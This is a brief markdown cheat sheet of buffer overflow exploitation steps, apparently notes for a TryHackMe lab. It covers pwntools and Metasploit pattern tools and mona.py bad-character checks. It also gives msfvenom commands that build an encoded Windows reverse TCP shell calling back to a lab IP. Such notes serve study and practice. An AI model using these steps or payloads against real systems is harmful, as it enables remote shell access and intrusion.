# Generating unique patterns
buffer overflow stuff

## cyclic patterns
```
from pwn import *
cyclic(3000)
cyclic_find('abdd')
out[100] 2907
```


OR
```
cyclic_metasploit(3000)
cyclic_metasploit_find(0x33794332) 
```
OR

```
msf-pattern-create -l 3000
msf-pattern-offset -l 3000 -q 33794332

```
```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600
```

## Mona CheatSheet

**Setup your working directory**

`!mona config -set workingfolder c:\mona\%p`

<br>
<br>

`!mona findmsp -distance 600 `

`/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb  -l 2400 -q 6F43396E`



**Generate a byte array**

`!mona bytearray -b "\x00"`

<br>
<br>

**Run your fuzzer till a crash**

**compare your stuff**

`!mona compare -f C:\mona\bytearray.bin -a ESP`

<br>
<br>

**Add newly found bad chars to your list to be removed, and regenerate your badchars list**

`!mona bytearray -b "\x00\x0a"`

<br>
<br>

**Resend the new list of badchars, and then compare again**

`!mona compare -f C:\mona\bytearray.bin -a ESP`

<br>
<br>

## MSF Payloads

`msfvenom -l payloads `

`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.103 LPORT=443 EXITFUNC=thread  -f c –e x86/shikata_ga_nai -b "\x00\x0a"`

`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.103 LPORT=443 EXITFUNC=thread  -f c –e x86/shikata_ga_nai -b "\x00\x0a" > shelloutput1.txt`

`sed -z 's/\n//g' shelloutput1.txt | sed -z 's/"//g' - `

https://tryhackme.com/room/bufferoverflowprep 

https://www.youtube.com/watch?v=1X2JGF_9JGM 
